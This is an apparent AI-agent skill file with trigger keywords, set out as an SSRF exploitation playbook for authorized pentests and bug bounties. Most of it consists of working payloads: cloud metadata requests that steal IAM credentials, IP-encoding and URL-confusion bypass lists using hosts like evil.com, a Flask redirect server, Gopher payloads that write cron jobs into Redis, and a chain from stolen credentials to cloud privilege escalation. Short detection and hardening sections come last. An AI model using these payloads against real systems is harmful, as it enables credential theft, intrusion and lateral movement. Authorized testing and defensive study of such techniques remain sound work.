---
id: ssrf-specialist
name: SSRF Specialist
description: >
  Server-Side Request Forgery detection and exploitation specialist for authorized
  pentests and bug bounty — covers SSRF taxonomy (basic, blind, semi-blind), IMDS
  exploitation across AWS/GCP/Azure, filter bypass techniques (IP encoding tricks,
  DNS rebinding, Gopher protocol chains), cloud-credential handoff, and blind SSRF
  via out-of-band techniques. Use when testing for or exploiting SSRF vulnerabilities
  in web applications or cloud environments.
triggers:
  - ssrf
  - server-side request forgery
  - internal URLs
  - metadata endpoint
  - "169.254.169.254"
  - cloud metadata
  - imds
  - gopher ssrf
  - blind ssrf
  - collaborator ssrf
  - internal service access
  - url fetch endpoint
version: "1.0"
authored: "2026-10-30"
---

# SSRF Specialist Skill

## Overview

Server-Side Request Forgery (SSRF) causes a server-side component to make HTTP (or
other protocol) requests to an attacker-controlled destination. Impact ranges from
internal network scanning to full cloud-credential theft and RCE via IMDS chains.

**Scope:** authorized pentests and bug bounty programs only. All targets below are
placeholders — substitute only in-scope systems.

---

## 1. SSRF Taxonomy

### 1.1 Basic (In-Band) SSRF
The response body from the forged request is reflected back to the attacker.

```
GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
```

Highest impact: direct read of IMDS, internal APIs, localhost admin panels.

### 1.2 Semi-Blind SSRF
No response body, but status code / response time / error message leaks information.

- Status 200 vs 404 reveals whether a host/port is alive.
- Timing differences reveal open vs filtered ports.

### 1.3 Blind SSRF
No in-band signal at all. Exploitation requires out-of-band (OOB) channel.

- Burp Collaborator / interactsh to confirm DNS/HTTP pingback.
- Then escalate to IMDS or internal service if the network path exists.

---

## 2. Finding SSRF — Source Locations

| Location | Look For |
|---|---|
| URL parameters | `url=`, `path=`, `src=`, `href=`, `redirect=`, `next=`, `page=`, `file=`, `link=`, `image=`, `fetch=`, `endpoint=`, `api=`, `callback=`, `load=` |
| JSON/XML body | `"url":`, `"uri":`, `"href":`, `"image_url":`, `"webhook":` |
| HTTP headers | `X-Forwarded-For`, `Referer` (if the app fetches it), `Host` (internal routing), `X-Custom-IP-Authorization` |
| File upload | Filename with URL, SVG with `<image href="...">`, PDF with external resources |
| Webhooks / import | Slack integrations, Zapier triggers, import-from-URL features |
| PDF/screenshot generators | wkhtmltopdf, headless Chrome `file://` and `http://` in HTML input |

### Minimal PoC test

```
# Set up OOB listener
python3 -m http.server 8080   # or use Burp Collaborator subdomain

# Test parameter
GET /api/render?url=http://<collaborator-host>/ssrf-test
```

---

## 3. IMDS Exploitation

### 3.1 AWS EC2 IMDSv1 (no token required)

```
# Enumerate roles
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Steal credentials for role "web-app"
http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app
```

Response contains `AccessKeyId`, `SecretAccessKey`, `Token` — use immediately with
`aws configure` or env vars, then:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
```

#### IMDSv2 bypass (token-based)
IMDSv2 requires a PUT to get a token first. If the SSRF allows PUT or the app uses
an HTTP library that follows redirects with method change, try:

```
# Step 1 — get token (PUT via SSRF if possible)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2 — use token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <token>
```

If the SSRF can only do GET, IMDSv2 blocks you — but many deployments still run
IMDSv1. Check the response; a 401 indicates IMDSv2 enforcement.

### 3.2 GCP Metadata Service

```
# Requires header: Metadata-Flavor: Google (often bypassable via SSRF)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

The `Metadata-Flavor: Google` header is required but the server-side app may add
it automatically, or the SSRF can inject headers if the endpoint is parameterized
(e.g., `url=http://...&header=Metadata-Flavor: Google`).

### 3.3 Azure IMDS

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires Metadata: true header — same injection trick as GCP

http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F
```

### 3.4 Other Internal Metadata Endpoints

| Service | Endpoint |
|---|---|
| DigitalOcean | `http://169.254.169.254/metadata/v1/` |
| Alibaba Cloud | `http://100.100.100.200/latest/meta-data/` |
| Oracle Cloud | `http://169.254.169.254/opc/v1/instance/` |
| Kubernetes API (if node) | `https://kubernetes.default.svc/api/v1/` |
| Docker daemon socket | `http://localhost:2375/v1.41/containers/json` |
| Consul | `http://localhost:8500/v1/kv/` |
| etcd | `http://localhost:2379/v2/keys/` |

---

## 4. Filter Bypass Techniques

### 4.1 127.0.0.1 / localhost Variants

```
127.0.0.1           # blocked by most filters
0177.0.0.1          # octal notation
0x7f000001          # hex notation
2130706433          # decimal (int) notation
127.1               # short notation
127.0.1             # alternate short
::1                 # IPv6 loopback
::ffff:127.0.0.1    # IPv4-mapped IPv6
0.0.0.0             # zero address (routes to localhost on many OS)
localhost           # if DNS not blocked
LOCALHOST           # case variation
%6c%6f%63%61%6c%68%6f%73%74   # URL encoded
```

### 4.2 169.254.169.254 Variants

```
169.254.169.254
0251.0376.0251.0376         # octal
0xa9.0xfe.0xa9.0xfe         # hex
2852039166                   # decimal
169.254.169.254.xip.io       # DNS wildcard (check if nip.io/xip.io accessible)
```

### 4.3 DNS-Based Bypasses

```
# Register a domain whose A record points to 169.254.169.254 or 127.0.0.1
# Many filters check the supplied hostname, not the resolved IP

# DNS rebinding: first DNS query returns an allowed IP; app passes allowlist check.
# Second resolution (actual fetch) returns 127.0.0.1 or 169.254.169.254.
# Tools: singularity.me, DNSRebinder

# Collaborator with custom DNS resolution
```

### 4.4 URL Encoding and Schema Tricks

```
http://169.254.169.254%2Flatest%2Fmeta-data%2F    # path encoding
http://169.254.169.254/latest/meta-data%2F         # partial encoding
http://user@169.254.169.254/...                    # user-info bypass
http://169.254.169.254#@evil.com/...               # fragment confusion
http://169.254.169.254\.evil.com/                  # backslash confusion
http://evil.com@169.254.169.254/                   # authority confusion
```

### 4.5 Redirect Chains

If the SSRF fetches a URL and follows redirects, host an HTTP server that 302-redirects
to the internal target:

```python
from flask import Flask, redirect
app = Flask(__name__)

@app.route("/redir")
def redir():
    return redirect("http://169.254.169.254/latest/meta-data/iam/security-credentials/", 302)

app.run(port=80)
```

Then submit: `url=http://<attacker-server>/redir`

### 4.6 Scheme Confusion

```
file:///etc/passwd          # local file read (if file:// not blocked)
dict://127.0.0.1:6379/      # Redis banner grab
gopher://127.0.0.1:6379/_FLUSHALL%0d%0a   # Gopher to Redis (see §5)
sftp://internal-host/       # SFTP (rare but triggers auth)
```

---

## 5. Gopher Protocol Chains

Gopher lets SSRF send arbitrary TCP payloads (no header overhead), enabling
interaction with Redis, Memcached, SMTP, FTP, and other plaintext protocols.

### 5.1 Gopher Format

```
gopher://<host>:<port>/_<URL-encoded-payload>
```

The `_` is a required single-character selector that is discarded; everything after
it is sent as-is after URL decoding.

### 5.2 Redis via Gopher

```
# SET a key
gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Afoo%0D%0A%243%0D%0Abar%0D%0A

# Decoded payload:
*3\r\n$3\r\nSET\r\n$3\r\nfoo\r\n$3\r\nbar\r\n

# Write a cron job (requires redis running as root or writable path):
gopher://127.0.0.1:6379/_<CONFIG+SET+dir+/etc/cron.d><CONFIG+SET+dbfilename+evil><SET+crontab+value><BGSAVE>
# Use Gopherus tool to auto-generate payloads
```

**Tool:** [Gopherus](https://github.com/tarunkant/Gopherus) — generates ready Gopher
payloads for Redis, MySQL, FastCGI, Memcached, SMTP, ZABBIX, and others.

```bash
python gopherus.py --exploit redis
```

### 5.3 SMTP via Gopher (mail relay)

```
gopher://127.0.0.1:25/_EHLO%20attacker%0d%0aMAIL%20FROM%3A<forged@domain>%0d%0a...
```

### 5.4 FastCGI via Gopher (common behind Nginx)

```
# Gopherus generates these automatically
python gopherus.py --exploit fastcgi
```

---

## 6. Blind SSRF — Out-of-Band Confirmation

### 6.1 Setup OOB Listener

```bash
# Option 1: interactsh (open-source Burp Collaborator alternative)
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client
# generates: <random>.oast.pro

# Option 2: Burp Collaborator (Burp Suite Pro)
# Burp → Collaborator → Copy to clipboard

# Option 3: canarytokens.org (web-based, no setup)
```

### 6.2 Upgrade Blind → Full

Once OOB confirms the server reaches out:

1. Test direct IMDS: `http://169.254.169.254/latest/meta-data/`
2. Test internal hosts: iterate RFC-1918 ranges
3. If response times differ → port scanning via timing

### 6.3 Automated Scanning

```bash
# nuclei SSRF templates
nuclei -t fuzzing/ssrf.yaml -u https://target.com

# SSRFire
python3 ssrfire.py -u "https://target.com/fetch?url=FUZZ" -d "oast-id.oast.pro"

# ffuf with SSRF payloads
ffuf -w ssrf-payloads.txt -u "https://target.com/fetch?url=FUZZ"
```

---

## 7. Cloud-to-RCE Handoff

Once IMDS credentials are stolen:

1. **AWS:** `aws sts get-caller-identity` → identify role → enumerate with
   `enumerate-iam` tool → escalate via [Pacu](https://github.com/RhinoSecurityLabs/pacu)
   → invoke Lambda, write S3, AssumeRole pivot.
2. **GCP:** Use token → `gcloud auth activate-service-account` → enumerate IAM bindings
   → escalate via `iam.serviceAccountTokenCreator` role.
3. **Azure:** Use token → `az login --service-principal` → enumerate subscriptions →
   escalate via managed identity or Key Vault secrets.

For full cloud exploitation chains, trigger the `cloud-attack` skill.

---

## 8. Detection and Hardening

| Detection | Signal |
|---|---|
| IMDS calls from unexpected process | CloudTrail `169.254.169.254` source in EC2 metadata |
| Unusual IAM activity | `sts:GetCallerIdentity` from new IP/ASN |
| Outbound connections from web process | Host-based firewall / egress monitoring |
| Gopher/dict/file scheme in app logs | WAF or proxy logs |

**Hardening:**
- Enforce IMDSv2 (`HttpTokens: required` in launch template).
- Block `169.254.169.254` at the host firewall for non-hypervisor processes.
- Allowlist outbound URLs to known external domains only (block RFC-1918, 169.254.x.x, ::1).
- Parse and validate URL scheme, host, and resolved IP before fetching.
- Run web application as a dedicated low-privilege user with no IAM role attached unless required.

---

## 9. Finding Schema (Report Format)

```
Title: SSRF in [parameter/endpoint]
Severity: Critical / High
CWE: CWE-918
CVSS: 9.8 (Critical) if IMDS chain; 8.6 if blind+internal; 6.5 if basic+limited
Evidence:
  - Request: [HTTP request triggering SSRF]
  - Response / OOB pingback confirming fetch
  - IMDS credential dump (redacted in report, full in secure attachment)
Impact:
  - Cloud credential theft (AWS/GCP/Azure role)
  - Internal network enumeration
  - [Specific service accessed, e.g., Redis RCE via Gopher]
Remediation:
  1. Enforce URL allowlist (scheme, hostname, resolved IP).
  2. Enable IMDSv2.
  3. Block 169.254.0.0/16 at host firewall for the web process.
References:
  - https://portswigger.net/web-security/ssrf
  - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
```
